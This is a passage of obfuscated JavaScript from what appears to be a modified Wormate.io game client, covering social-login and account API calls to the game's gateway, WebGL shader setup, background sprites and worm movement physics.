              _0x2f3ae6(_0x225e18);
            }
          });
        };
        _0x34fad6.prototype.Hl = function (_0x51ed45, _0x2f6c27, _0x23e447, _0x22f4f4) {
          var _0x9f68f7 = _0x503ed4.a.b + "/pub/wuid/" + this.Qk + "/buyProperty?id=" + _0x51ed45 + "&type=" + _0x2f6c27;
          _0x503ed4.Z(_0x9f68f7, function () {
            _0x23e447();
          }, function (_0x24782e) {
            if (_0x24782e.code !== 1200) {
              _0x23e447();
            } else {
              _0x22f4f4(_0x24782e);
            }
          });
        };
        _0x34fad6.prototype.Il = function (_0x50fe6c, _0x5d7d77) {
          var _0x2e35e3 = _0x503ed4.a.b + "/pub/wuid/" + this.Qk + "/deleteAccount";
          _0x503ed4.Z(_0x2e35e3, _0x50fe6c, function (_0x324ea6) {
            if (_0x324ea6.code !== 1200) {
              _0x50fe6c();
            } else {
              _0x5d7d77(_0x324ea6);
            }
          });
        };
        _0x34fad6.prototype.Jl = function (_0x255554) {
          var _0x5c55ac = this;
          if (this.Pk) {
            this.Kl();
          }
          _0x34fad6.Sk.Xk(function () {
            _0x255554();
          }, function (_0x30698e) {
            _0x5c55ac.Ll("fb", _0x30698e.Uk, _0x255554);
          });
        };
        _0x34fad6.prototype.Ml = function (_0xa35052) {
          var _0x2e00fb = this;
          if (this.Pk) {
            this.Kl();
          }
          _0x34fad6.$k.Xk(function () {
            _0xa35052();
          }, function (_0x5c601b) {
            _0x2e00fb.Ll("gg", _0x5c601b.Uk, _0xa35052);
          });
        };
        _0x34fad6.prototype.Ll = function (_0x15b420, _0xcc6883, _0x3b0de9, _0x36c904) {
          _0x36c904 = _0x36c904 || 0;
          var _0x3a121c = $("#please-wait-view");
          if (_0x36c904 < 1) {
            _0x3a121c.append(" AUTO CONNECTION <i id=\"auto_connection_text\">" + _0x36c904 + "<i>...");
          }
          var _0x1c208c = this;
          var _0x392e23 = _0x15b420 + "_" + _0xcc6883;
          var _0x254253 = "https://gateway.wormate.io/pub/wuid/" + _0x392e23 + "/login";
          vps.wuid = _0x392e23;
          _0x36c904++;
          _0x3a121c.fadeIn(500);
          $("#auto_connection_text").html(_0x36c904);
          fetch(_0x254253, {
            mode: "cors"
          }).then(function (_0x24c826) {
            if (_0x24c826.ok) {
              return _0x24c826.json();
            } else {
              throw new Error("Request error");
            }
          }).then(function (_0x3889af) {
            if (_0x3889af.code !== 1200) {
              _0x1c208c.Ll(_0x15b420, _0xcc6883, _0x3b0de9, _0x36c904);
              return;
            }
            if (_0x3889af.user_data) {
              _0x3a121c.html("...");
              _0x3a121c.fadeOut(500);
              _0x1c208c.Ol(_0x15b420, _0xcc6883, _0x3889af.user_data);
              if (_0x3b0de9 != null) {
                _0x3b0de9();
              }
            }
          }).catch(function (_0x4f8514) {
            _0x1c208c.Nl();
            _0x3a121c.html("...");
            _0x3a121c.fadeOut(500);
          });
        };
        _0x34fad6.prototype.Kl = function () {
          try {
            this.Pl();
            this.Ql();
          } catch (_0x564ae2) {}
          this.Rl();
        };
        _0x34fad6.prototype.Sl = function () {
          if (this.Pk) {
            this.Il(function () {}, function (_0x1718c4) {});
          }
        };
        _0x34fad6.prototype.Nl = function () {
          _0xf1d21a().og.Ak(_0xf1d21a().og.tk);
        };
        _0x34fad6.prototype.Ol = function (_0x1ca87f, _0x4dff6c, _0xe5d94f) {
          var _0x10e288 = this;
          var _0x58ec7c = this.Pk ? this.Rk.userId : "guest";
          _0x1a9010(_0xe5d94f, function (_0x45f533) {
            _0x353f60(_0x45f533);
            _0x10e288.Pk = true;
            _0x10e288.Qk = _0x1ca87f + "_" + _0x4dff6c;
            _0x10e288.Rk = _0x45f533;
            vps.wuid = _0x10e288.Qk;
            _0x1c97c7.Vf.eg(_0x1c97c7.Vf.$f, _0x1ca87f, 60);
            if (_0x58ec7c !== _0x10e288.Rk.userId) {
              _0x10e288.Tl();
            } else {
              _0x10e288.Dl();
            }
            window.vps.loading = false;
          });
        };
        _0x34fad6.prototype.Rl = function () {
          var _0x4ee3a3 = this.Pk ? this.Rk.userId : "guest";
          this.Pk = false;
          this.Qk = _0x392fa5;
          this.Rk = {};
          _0x1c97c7.Vf.eg(_0x1c97c7.Vf.$f, "", 60);
          if (_0x4ee3a3 !== this.Rk.userId) {
            this.Tl();
          } else {
            this.Dl();
          }
        };
        _0x34fad6.prototype.bl = function () {
          var _0x443b2a = _0x1c97c7.Vf.fg(_0x1c97c7.Vf.$f);
          var _0x8def84 = this;
          if (_0x443b2a === "fb") {
            var _0x5dfe28 = 1;
            (function _0x437d2f() {
              if (!_0x34fad6.Sk.Vk() && _0x5dfe28++ < 5) {
                setTimeout(_0x437d2f, 1000);
                return;
              }
              _0x34fad6.Sk.Yk(function () {}, function (_0x2bd50f) {
                _0x8def84.Ll("fb", _0x2bd50f.Uk);
              });
            })();
          } else if (_0x443b2a === "gg") {
            var _0xa4ec6a = 1;
            (function _0x28468b() {
              if (!_0x34fad6.$k.Vk() && _0xa4ec6a++ < 5) {
                setTimeout(_0x28468b, 1000);
                return;
              }
              _0x34fad6.$k.Yk(function () {}, function (_0x430f5b) {
                _0x8def84.Ll("gg", _0x430f5b.Uk);
              });
            })();
          }
        };
        _0x34fad6.prototype.Tl = function () {
          for (var _0x370808 = 0; _0x370808 < this.Nk.length; _0x370808++) {
            this.Nk[_0x370808]();
          }
          this.Dl();
        };
        _0x34fad6.prototype.Dl = function () {
          for (var _0x31faab = 0; _0x31faab < this.Ok.length; _0x31faab++) {
            this.Ok[_0x31faab]();
          }
        };
        _0x34fad6.prototype.Pl = function () {
          _0x34fad6.Sk.Zk();
        };
        _0x34fad6.prototype.Ql = function () {
          _0x34fad6.$k.Zk();
        };
        return _0x34fad6;
      }();
      _0x1c97c7.if = function () {
        function _0x554e03(_0xf95de1, _0x172f22, _0x4b8616) {
          this.ef = _0x4b8616;
          this.hd = false;
          this.nc = new _0x32defb.Container();
          this.nc.visible = false;
          this.Ul = new Array(_0xf95de1);
          for (var _0x5dcb6a = 0; _0x5dcb6a < this.Ul.length; _0x5dcb6a++) {
            var _0x5638f1 = new _0x1c97c7.Vl(new Float32Array(_0x172f22 * 3));
            _0x5638f1.Wl(_0x172f22);
            this.Ul[_0x5dcb6a] = _0x5638f1;
            this.nc.addChild(_0x5638f1.tf());
          }
          this.ff = 1;
          this.gf = 1;
          this.Jf();
        }
        _0x554e03.prototype.tf = function () {
          return this.nc;
        };
        _0x554e03.prototype.Kf = function (_0x4e8416) {
          this.hd = _0x4e8416;
          this.nc.visible = _0x4e8416;
        };
        _0x554e03.prototype.Jf = function () {
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          var _0x5302fb = this.gf / 30;
          for (var _0x325420 = 0; _0x325420 < this.Ul.length; _0x325420++) {
            this.Ul[_0x325420].Xl(_0x5302fb);
          }
        };
        _0x554e03.prototype.Uf = function () {
          if (this.hd) {
            for (var _0x6299a7 = 0; _0x6299a7 < this.Ul.length; _0x6299a7++) {
              this.Ul[_0x6299a7].Uf(this.lf);
            }
          }
        };
        _0x554e03.prototype.Yl = function () {
          return this.ff;
        };
        _0x554e03.prototype.Zl = function () {
          return this.gf;
        };
        _0x554e03.prototype.Qf = function (_0x2ebb36, _0x59c614) {
          this.Ul[_0x2ebb36].$l(_0x59c614);
        };
        _0x554e03.prototype.Rf = function (_0x4b75af, _0x191760) {
          this.Ul[_0x4b75af]._l(_0x191760);
        };
        _0x554e03.prototype.Sf = function (_0x444509, _0x4f37ce, _0x3462f9) {
          var _0x50a55e = this.Ul[_0x444509];
          for (var _0x3e288c = _0x50a55e.am(), _0x2ccf72 = _0x50a55e.bm, _0x87a241 = 0; _0x87a241 < _0x3e288c; _0x87a241++) {
            _0x2ccf72[_0x87a241 * 3] = _0x4f37ce;
            _0x2ccf72[_0x87a241 * 3 + 1] = _0x3462f9;
            _0x2ccf72[_0x87a241 * 3 + 2] = 0;
          }
        };
        _0x554e03.prototype.Tf = function (_0x211284, _0x83ca5a, _0xadddad) {
          var _0x729763 = this.Ul[_0x211284];
          var _0x50b050 = _0x729763.am();
          var _0x59f7e9 = _0x729763.bm;
          var _0x18b8a6 = _0x729763.cm();
          var _0x5231af = _0x59f7e9[0];
          var _0x1d0695 = undefined;
          var _0x4fe176 = _0x59f7e9[1];
          var _0x19a76e = undefined;
          var _0x55d6ad = _0x83ca5a - _0x5231af;
          var _0x3c745f = _0xadddad - _0x4fe176;
          var _0x3f6b35 = Math.hypot(_0x55d6ad, _0x3c745f);
          if (_0x3f6b35 > 0) {
            _0x59f7e9[0] = _0x83ca5a;
            _0x59f7e9[1] = _0xadddad;
            _0x59f7e9[2] = Math.atan2(_0x3c745f, _0x55d6ad);
            var _0xfd45a8 = _0x18b8a6 * 0.25 / (_0x18b8a6 * 0.25 + _0x3f6b35);
            var _0xbca50d = 1 - _0xfd45a8 * 2;
            for (var _0x105f0d = 1, _0x4e33b7 = _0x50b050; _0x105f0d < _0x4e33b7; _0x105f0d++) {
              _0x1d0695 = _0x59f7e9[_0x105f0d * 3];
              _0x59f7e9[_0x105f0d * 3] = _0x59f7e9[_0x105f0d * 3 - 3] * _0xbca50d + (_0x1d0695 + _0x5231af) * _0xfd45a8;
              _0x5231af = _0x1d0695;
              _0x19a76e = _0x59f7e9[_0x105f0d * 3 + 1];
              _0x59f7e9[_0x105f0d * 3 + 1] = _0x59f7e9[_0x105f0d * 3 - 2] * _0xbca50d + (_0x19a76e + _0x4fe176) * _0xfd45a8;
              _0x4fe176 = _0x19a76e;
              _0x59f7e9[_0x105f0d * 3 + 2] = Math.atan2(_0x59f7e9[_0x105f0d * 3 - 2] - _0x59f7e9[_0x105f0d * 3 + 1], _0x59f7e9[_0x105f0d * 3 - 3] - _0x59f7e9[_0x105f0d * 3]);
            }
          }
        };
        return _0x554e03;
      }();
      _0x1c97c7.dm = function () {
        function _0x41754d(_0x528b21) {
          var _0x2763ae = this;
          this.ef = _0x528b21;
          this.Eb = _0x528b21.get()[0];
          this.lf = new _0x32defb.Renderer({
            view: _0x528b21.get()[0],
            transparent: true,
            antialias: false
          });
          this.hd = false;
          this.em = new _0x1c97c7.Vl(new Float32Array(_0x41dd32 * 3));
          this.ff = 1;
          this.gf = 1;
          this.fm = _0x24e7f7.gm;
          this.hm = _0x24e7f7.gm;
          this.im = _0x24e7f7.gm;
          this.jm = _0x24e7f7.gm;
          this.km = _0x24e7f7.gm;
          this.Jf();
          _0xf1d21a().Lc.$b(function () {
            _0x2763ae.em.lm();
          });
        }
        var _0x41dd32 = Math.min(100, _0x1c97c7.WormSpriteTree.wc);
        var _0x24e7f7 = {
          gm: "0lt0",
          mm: "0lt1",
          nm: "0lt2"
        };
        _0x41754d.prototype.Kf = function (_0x4ea698) {
          this.hd = _0x4ea698;
        };
        _0x41754d.prototype.Jf = function () {
          var _0x3a2422 = window.devicePixelRatio ? window.devicePixelRatio : 1;
          this.ff = this.ef.width();
          this.gf = this.ef.height();
          this.lf.resize(this.ff, this.gf);
          this.lf.resolution = _0x3a2422;
          this.Eb.width = _0x3a2422 * this.ff;
          this.Eb.height = _0x3a2422 * this.gf;
          var _0x134c3b = this.gf / 4;
          this.em.Xl(_0x134c3b);
          var _0x426442 = _0x503ed4.P(Math.floor(this.ff / _0x134c3b) * 2 - 5, 1, _0x41dd32);
          this.em.Wl(_0x426442);
        };
        _0x41754d.prototype.Nf = function () {
          if (this.hd) {
            var _0x54e7d8 = Date.now();
            var _0x4850f7 = _0x54e7d8 / 200;
            var _0x1ef07a = Math.sin(_0x4850f7);
            this.em.om(this.pm(this.fm, _0x1ef07a), this.qm(this.fm, _0x1ef07a));
            this.em.rm(this.sm(this.hm, _0x1ef07a), this.sm(this.im, _0x1ef07a), this.sm(this.jm, _0x1ef07a), this.sm(this.km, _0x1ef07a));
            var _0x59b61e = this.em.cm();
            for (var _0x27f44c = this.em.am(), _0x3c609c = this.em.bm, _0x426365 = this.ff - (this.ff - _0x59b61e * 0.5 * (_0x27f44c - 1)) * 0.5, _0x560e6d = this.gf * 0.5, _0x234915 = 0, _0x138a03 = 0, _0x1e77b7 = -1; _0x1e77b7 < _0x27f44c; _0x1e77b7++) {
              var _0x134233 = _0x1e77b7;
              var _0x9a754d = Math.cos(_0x134233 * 1 / 12 * Math.PI - _0x4850f7) * (1 - Math.pow(16, _0x134233 * -1 / 12));
              if (_0x1e77b7 >= 0) {
                _0x3c609c[_0x1e77b7 * 3] = _0x426365 + _0x59b61e * -0.5 * _0x134233;
                _0x3c609c[_0x1e77b7 * 3 + 1] = _0x560e6d + _0x59b61e * 0.5 * _0x9a754d;
                _0x3c609c[_0x1e77b7 * 3 + 2] = Math.atan2(_0x138a03 - _0x9a754d, _0x134233 - _0x234915);
              }
              _0x234915 = _0x134233;
              _0x138a03 = _0x9a754d;
            }
            this.em.Uf();
            this.em.tm(this.lf);
          }
        };
        _0x41754d.prototype.$l = function (_0x2a20ae) {
          this.em.$l(_0x2a20ae);
        };
        _0x41754d.prototype.um = function (_0xb9ad6f) {
          this.fm = _0xb9ad6f ? _0x24e7f7.nm : _0x24e7f7.mm;
          this.hm = _0x24e7f7.gm;
          this.im = _0x24e7f7.gm;
          this.jm = _0x24e7f7.gm;
          this.km = _0x24e7f7.gm;
        };
        _0x41754d.prototype.vm = function (_0x4927e4) {
          this.fm = _0x24e7f7.gm;
          this.hm = _0x4927e4 ? _0x24e7f7.nm : _0x24e7f7.mm;
          this.im = _0x24e7f7.gm;
          this.jm = _0x24e7f7.gm;
          this.km = _0x24e7f7.gm;
        };
        _0x41754d.prototype.wm = function (_0x2ade77) {
          this.fm = _0x24e7f7.gm;
          this.hm = _0x24e7f7.gm;
          this.im = _0x2ade77 ? _0x24e7f7.nm : _0x24e7f7.mm;
          this.jm = _0x24e7f7.gm;
          this.km = _0x24e7f7.gm;
        };
        _0x41754d.prototype.xm = function (_0x477a02) {
          this.fm = _0x24e7f7.gm;
          this.hm = _0x24e7f7.gm;
          this.im = _0x24e7f7.gm;
          this.jm = _0x477a02 ? _0x24e7f7.nm : _0x24e7f7.mm;
          this.km = _0x24e7f7.gm;
        };
        _0x41754d.prototype.ym = function (_0x432f43) {
          this.fm = _0x24e7f7.gm;
          this.hm = _0x24e7f7.gm;
          this.im = _0x24e7f7.gm;
          this.jm = _0x24e7f7.gm;
          this.km = _0x432f43 ? _0x24e7f7.nm : _0x24e7f7.mm;
        };
        _0x41754d.prototype.pm = function (_0x2d78f7, _0x18fb4c) {
          switch (_0x2d78f7) {
            case _0x24e7f7.mm:
              return 0.9 + _0x18fb4c * 0.1;
            case _0x24e7f7.nm:
              return 0.4 + _0x18fb4c * 0.3;
          }
          return 1;
        };
        _0x41754d.prototype.qm = function (_0x166925, _0x1cfae5) {
          switch (_0x166925) {
            case _0x24e7f7.mm:
              return 0.6 + _0x1cfae5 * 0.5;
            case _0x24e7f7.nm:
              return 0.3 + _0x1cfae5 * 0.3;
          }
          return 1;
        };
        _0x41754d.prototype.sm = function (_0x31aca8, _0x144076) {
          switch (_0x31aca8) {
            case _0x24e7f7.mm:
              return 0.9 + _0x144076 * 0.1;
            case _0x24e7f7.nm:
              return 0.6 + _0x144076 * 0.4;
          }
          return 1;
        };
        return _0x41754d;
      }();
      _0x1c97c7.Oj = function () {
        function _0x253e84(_0x3b8515, _0x4b6ee5, _0x269659, _0x3e055f, _0x31e7f1) {
          this.zm = _0x3b8515;
          this.Am = _0x4b6ee5;
          this.Bm = _0x269659;
          this.Cm = _0x3e055f;
          this.Dm = _0x31e7f1;
        }
        _0x253e84.Nj = function (_0x1ca838) {
          return new _0x253e84(_0x1ca838.price, _0x1ca838.guest, _0x1ca838.nonbuyable, _0x1ca838.nonbuyableCause, _0x1ca838.description || _0x1ca838.refer?.texture || "🎨   " + _0x1ca838.id);
        };
        _0x253e84.Pj = function (_0x7ebddb) {
          return new _0x253e84(_0x7ebddb.price, _0x7ebddb.guest, _0x7ebddb.nonbuyable, _0x7ebddb.nonbuyableCause, _0x7ebddb.description);
        };
        _0x253e84.prototype.Jj = function () {
          return this.zm;
        };
        _0x253e84.prototype.Mj = function () {
          return this.Am;
        };
        _0x253e84.prototype.Kj = function () {
          return this.Bm;
        };
        _0x253e84.prototype.Em = function () {
          return this.Cm;
        };
        _0x253e84.prototype.Fm = function () {
          return this.Dm;
        };
        return _0x253e84;
      }();
      _0x1c97c7.qf = function () {
        function _0x1d798d(_0x8c423) {
          this.Gm = {};
          this.Gm[_0x40a13f] = _0x8c423;
          var _0xee47ea = _0x32defb.Shader.from(_0x8a4542, _0x32204c, this.Gm);
          this.sf = new _0x32defb.Mesh(_0x152e94, _0xee47ea);
          this.sf.blendMode = _0x32defb.v.B;
        }
        var _0x2c666e = "a1_" + _0x503ed4.X();
        var _0x5f46cb = "a2_" + _0x503ed4.X();
        var _0x40a13f = "u3_" + _0x503ed4.X();
        var _0x3bf10b = "u4_" + _0x503ed4.X();
        var _0x35ca21 = "v1_" + _0x503ed4.X();
        var _0x152e94 = new _0x32defb.Geometry().addAttribute(_0x2c666e, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2).addAttribute(_0x5f46cb, [0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1], 2);
        var _0x8a4542 = "precision mediump float;attribute vec2 " + _0x2c666e + ";attribute vec2 " + _0x5f46cb + ";uniform mat3 translationMatrix ;uniform mat3 projectionMatrix; uniform vec4 " + _0x3bf10b + ";varying vec2 " + _0x35ca21 + ";const float ROT_ANGLE_DEG=7.5;const float ROT_COS=cos(ROT_ANGLE_DEG/180.0*6.283185307179586);const float ROT_SIN=sin(ROT_ANGLE_DEG/180.0*6.283185307179586);void main(){gl_Position=vec4((projectionMatrix * translationMatrix * vec3(" + _0x2c666e + ",1.0)).xy,0.0,1.0);vec4 _ScreenParams=" + _0x3bf10b + ";vec2 uv=" + _0x5f46cb + ";vec2 mul=0.5*vec2(_ScreenParams.x*(_ScreenParams.w-1.0)+1.0,_ScreenParams.y*(_ScreenParams.z-1.0)+1.0);vec2 v2=(uv-vec2(0.5,0.5))*mul*1.25;v2=vec2(v2.x*ROT_COS-v2.y*ROT_SIN,v2.x*ROT_SIN+v2.y*ROT_COS)*vec2(1,2);uv=v2;" + _0x35ca21 + "=uv;}";
        var _0x32204c = "precision highp float;varying vec2 " + _0x35ca21 + ";uniform sampler2D " + _0x40a13f + ";void main(){gl_FragColor=texture2D(" + _0x40a13f + "," + _0x35ca21 + ");}";
        _0x1d798d.prototype.Mf = function (_0x4902dd, _0x550ccf) {
          this.sf.scale.x = _0x4902dd;
          this.sf.scale.y = _0x550ccf;
          this.Gm[_0x3bf10b] = [_0x4902dd, _0x550ccf, 1 / _0x4902dd + 1, 1 / _0x550ccf + 1];
        };
        return _0x1d798d;
      }();
      _0x1c97c7.WMGBS1 = function () {
        function _0xc87e87(_0x63f0b8) {
          var _0x2f0d9b = vps.bgGameWidth || 1;
          var _0x1ea572 = vps.bgGameHeight || 1;
          var _0x2913d4 = 1100;
          var _0x1876ea = _0x2f0d9b > 512 ? _0x2f0d9b >= 1000 ? 1 : 0.1 : 0.01;
          this.Gm = {};
          this.Gm[_0x5605ab] = [1, 0.5, 0.25, 0.5];
          this.Gm[_0x4ec026] = _0x32defb.Texture.WHITE;
          this.Gm[_0x1fd198] = [0, 0];
          this.Gm[_0x4fcada] = [0, 0];
          this.sf = new PIXI.TilingSprite(_0x63f0b8 || _0x3b6ea9.xe._g, _0x1876ea == 1 ? _0x2913d4 : 120000, _0x1876ea == 1 ? _0x2913d4 : 120000);
          this.sf.scale.x = _0x1876ea;
          this.sf.scale.y = _0x1876ea;
          this.sf.position.x = -(_0x1876ea == 1 ? _0x2f0d9b / 2 : 625);
          this.sf.position.y = -(_0x1876ea == 1 ? _0x1ea572 / 2 : 625);
          console.log("WMGBS1", _0x2f0d9b, _0x1ea572);
        }
        var _0x5605ab = "u3_";
        var _0x4ec026 = "u4_";
        var _0x1fd198 = "u5_";
        var _0x4fcada = "u6_";
        _0xc87e87.prototype.Ec = function (_0x2b06ac, _0x139cc6, _0x57fed6, _0x3d6765) {
          var _0x560c7c = this.Gm[_0x5605ab];
          _0x560c7c[0] = _0x2b06ac;
          _0x560c7c[1] = _0x139cc6;
          _0x560c7c[2] = _0x57fed6;
          _0x560c7c[3] = _0x3d6765;
        };
        _0xc87e87.prototype.$g = function (_0x165273) {
          this.Gm[_0x4ec026] = _0x165273;
        };
        _0xc87e87.prototype.Uf = function (_0x1cbbc8, _0xe41bb2, _0x220bac, _0x89ed4) {};
        return _0xc87e87;
      }();
      _0x1c97c7.WMGBS2 = function () {
        function _0x50edc6() {
          this.Gm = {};
          this.Gm[_0x408221] = [1, 0.5, 0.25, 0.5];
          this.Gm[_0xe573a] = _0x32defb.Texture.WHITE;
          this.Gm[_0x40cf29] = [0, 0];
          this.Gm[_0x2bb552] = [0, 0];
          var _0x348e0c = _0x32defb.Shader.from(_0x3b6263, _0x65a5f0, this.Gm);
          this.sf = new _0x32defb.Mesh(_0x272b59, _0x348e0c);
        }
        var _0x27b957 = "a1_" + _0x503ed4.X();
        var _0xa5fb43 = "a2_" + _0x503ed4.X();
        var _0x1ed70a = "translationMatrix";
        var _0x437eea = "projectionMatrix";
        var _0x408221 = "u3_" + _0x503ed4.X();
        var _0xe573a = "u4_" + _0x503ed4.X();
        var _0x40cf29 = "u5_" + _0x503ed4.X();
        var _0x2bb552 = "u6_" + _0x503ed4.X();
        var _0x35fa99 = "v1_" + _0x503ed4.X();
        var _0x272b59 = new _0x32defb.Geometry().addAttribute(_0x27b957, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2).addAttribute(_0xa5fb43, [-0.5, -0.5, 0.5, -0.5, 0.5, 0.5, -0.5, -0.5, 0.5, 0.5, -0.5, 0.5], 2);
        var _0x3b6263 = "precision mediump float;attribute vec2 " + _0x27b957 + ";attribute vec2 " + _0xa5fb43 + ";uniform mat3 " + _0x1ed70a + ";uniform mat3 " + _0x437eea + ";varying vec2 " + _0x35fa99 + ";void main(){" + _0x35fa99 + "=" + _0xa5fb43 + ";gl_Position=vec4((" + _0x437eea + "*" + _0x1ed70a + "*vec3(" + _0x27b957 + ",1.0)).xy,0.0,1.0);}";
        var _0x65a5f0 = "precision highp float;varying vec2 " + _0x35fa99 + ";uniform vec4 " + _0x408221 + ";uniform sampler2D " + _0xe573a + ";uniform vec2 " + _0x40cf29 + ";uniform vec2 " + _0x2bb552 + ";void main(){vec2 coord=" + _0x35fa99 + "*" + _0x40cf29 + "+" + _0x2bb552 + ";vec4 v_color_mix=" + _0x408221 + ";gl_FragColor=texture2D(" + _0xe573a + ",coord)*0.3+v_color_mix.a*vec4(v_color_mix.rgb,0.0);}";
        _0x50edc6.prototype.Ec = function (_0xf1e7a9, _0x1c70b7, _0x502aad, _0x56a9e0) {
          var _0x24ff2f = this.Gm[_0x408221];
          _0x24ff2f[0] = _0xf1e7a9;
          _0x24ff2f[1] = _0x1c70b7;
          _0x24ff2f[2] = _0x502aad;
          _0x24ff2f[3] = _0x56a9e0;
        };
        _0x50edc6.prototype.$g = function (_0x75b2d4) {
          this.Gm[_0xe573a] = _0x75b2d4;
        };
        _0x50edc6.prototype.Uf = function (_0x2699df, _0x460e79, _0x4590b0, _0x5b21e8) {
          this.sf.position.x = _0x2699df;
          this.sf.position.y = _0x460e79;
          this.sf.scale.x = _0x4590b0;
          this.sf.scale.y = _0x5b21e8;
          var _0x1d00d7 = this.Gm[_0x40cf29];
          _0x1d00d7[0] = _0x4590b0 * 0.2520615384615385;
          _0x1d00d7[1] = _0x5b21e8 * 0.4357063736263738;
          var _0x199650 = this.Gm[_0x2bb552];
          _0x199650[0] = _0x2699df * 0.2520615384615385;
          _0x199650[1] = _0x460e79 * 0.4357063736263738;
        };
        return _0x50edc6;
      }();
      _0x1c97c7.sc = function () {
        function _0x41d888() {
          this.xc = new PIXI.Sprite();
          this.ev = null;
          this.Hm = 0;
          this.Im = 0;
          this.si = null;
        }
        _0x41d888.prototype.Bc = function (_0x35092b, _0x509df8, _0x229998) {
          if (_0x35092b) {
            this.xc.texture = _0x35092b.Ea();
            this.xc.anchor.set(_0x35092b.ya, _0x35092b.za);
            this.Hm = _0x35092b.Aa;
            this.Im = _0x35092b.Ba;
          } else {}
        };
        _0x41d888.prototype.Ec = function (_0x3ab0c4) {
          this.xc.tint = parseInt(_0x3ab0c4.substring(1), 16);
        };
        _0x41d888.prototype.Tc = function (_0x2e1ead) {
          try {
            this.xc.width = _0x2e1ead * this.Hm;
            this.xc.height = _0x2e1ead * this.Im;
          } catch (_0xfc773b) {}
        };
        _0x41d888.prototype.md = function (_0x250110) {
          this.xc.rotation = _0x250110;
        };
        _0x41d888.prototype.ld = function (_0x41700d, _0x165a99) {
          this.xc.position.set(_0x41700d, _0x165a99);
        };
        _0x41d888.prototype.kd = function (_0x3f20dc) {
          this.xc.visible = _0x3f20dc;
        };
        _0x41d888.prototype.gd = function () {
          return this.xc.visible;
        };
        _0x41d888.prototype.jj = function (_0x467a14) {
          this.xc.alpha = _0x467a14;
        };
        _0x41d888.prototype.Qc = function () {
          return this.xc;
        };
        _0x41d888.prototype.Rc = function () {
          _0x503ed4.U(this.xc);
        };
        return _0x41d888;
      }();
      _0x1c97c7.Worm = function () {
        function _0x453474(_0x95506c) {
          this.hh = _0x95506c;
          this.Eh = new _0x1c97c7.Worm.li();
          this.xi = false;
          this.wi = true;
          this.Xc = false;
          this.$c = 0;
          this.Jm = 0;
          this.dj = 1;
          this.bd = 0;
          this.Bh = 0;
          this.dd = {};
          this.ad = 0;
          this.Km = new Float32Array(_0x527c8b * 2);
          this.Lm = new Float32Array(_0x527c8b * 2);
          this._c = new Float32Array(_0x527c8b * 2);
          this.Mm = null;
          this.Nm = null;
          this.Om = null;
          this.Pm();
        }
        var _0x527c8b = 200;
        _0x453474.prototype.si = function () {
          if (this.Nm != null) {
            _0x503ed4.U(this.Nm.nc);
          }
          if (this.Om != null) {
            _0x503ed4.U(this.Om);
          }
        };
        _0x453474.prototype.Pm = function () {
          this.zi(0.25);
          this.Eh.ma = "";
          this.wi = true;
          this.dd = {};
          this.kd(false);
        };
        _0x453474.prototype.ri = function (_0x3253fb) {
          this.Eh = _0x3253fb;
          this.Qm(this.xi);
        };
        _0x453474.prototype.kd = function (_0x3ece83) {
          var _0x111670 = this.xi;
          this.xi = _0x3ece83;
          this.Qm(_0x111670);
        };
        _0x453474.prototype.zi = function (_0x282cc9) {
          this.Bh = _0x282cc9 * 50;
          var _0x214a67 = _0x282cc9;
          if (_0x282cc9 > this.hh.Ag) {
            _0x214a67 = Math.atan((_0x282cc9 - this.hh.Ag) / this.hh.Bg) * this.hh.Bg + this.hh.Ag;
          }
          var _0x1d7eda = Math.sqrt(Math.pow(_0x214a67 * 5, 0.707106781186548) * 4 + 25);
          var _0x4edef8 = Math.min(_0x527c8b, Math.max(3, (_0x1d7eda - 5) * 5 + 1));
          var _0x50b165 = this.ad;
          this.$c = (5 + _0x1d7eda * 0.9) * 0.025;
          this.ad = Math.floor(_0x4edef8);
          this.Jm = _0x4edef8 - this.ad;
          if (_0x50b165 > 0 && _0x50b165 < this.ad) {
            var _0xa03a0d = this.Km[_0x50b165 * 2 - 2];
            var _0x236ec2 = this.Km[_0x50b165 * 2 - 1];
            var _0x27bbcb = this.Lm[_0x50b165 * 2 - 2];
            var _0x395133 = this.Lm[_0x50b165 * 2 - 1];
            var _0xd09c3 = this._c[_0x50b165 * 2 - 2];
            var _0xb2150e = this._c[_0x50b165 * 2 - 1];
            for (var _0x835825 = _0x50b165; _0x835825 < this.ad; _0x835825++) {
              this.Km[_0x835825 * 2] = _0xa03a0d;
              this.Km[_0x835825 * 2 + 1] = _0x236ec2;
              this.Lm[_0x835825 * 2] = _0x27bbcb;
              this.Lm[_0x835825 * 2 + 1] = _0x395133;
              this._c[_0x835825 * 2] = _0xd09c3;
              this._c[_0x835825 * 2 + 1] = _0xb2150e;
            }
          }
        };
        _0x453474.prototype.Ei = function (_0x190f42, _0x966846) {
          this.ad = _0x966846;
          for (var _0x3e5e52 = 0; _0x3e5e52 < this.ad; _0x3e5e52++) {
            this.Km[_0x3e5e52 * 2] = this.Lm[_0x3e5e52 * 2] = this._c[_0x3e5e52 * 2] = _0x190f42();
            this.Km[_0x3e5e52 * 2 + 1] = this.Lm[_0x3e5e52 * 2 + 1] = this._c[_0x3e5e52 * 2 + 1] = _0x190f42();
          }
        };
        _0x453474.prototype.Bi = function (_0x39889c, _0x52dda4, _0x4944a6) {
          this.Xc = _0x4944a6;
          for (var _0xa29c0a = 0; _0xa29c0a < this.ad; _0xa29c0a++) {
            this.Km[_0xa29c0a * 2] = this.Lm[_0xa29c0a * 2];
            this.Km[_0xa29c0a * 2 + 1] = this.Lm[_0xa29c0a * 2 + 1];
          }
          var _0xbe3e32 = _0x39889c - this.Lm[0];
          var _0x30d0e0 = _0x52dda4 - this.Lm[1];
          this.Rm(_0xbe3e32, _0x30d0e0, this.ad, this.Lm);
        };
        _0x453474.prototype.Rm = function (_0x5b1461, _0x43eafb, _0x24e48c, _0x12f0b7) {
          var _0x50fb4e = Math.hypot(_0x5b1461, _0x43eafb);
          if (!(_0x50fb4e <= 0)) {
            var _0x4668bd = _0x12f0b7[0];
            var _0x345d34 = undefined;
            _0x12f0b7[0] += _0x5b1461;
            var _0x368df4 = _0x12f0b7[1];
            var _0x3a53e9 = undefined;
            _0x12f0b7[1] += _0x43eafb;
            var _0x2c1a9a = this.$c / (this.$c + _0x50fb4e);
            var _0x337e83 = 1 - _0x2c1a9a * 2;
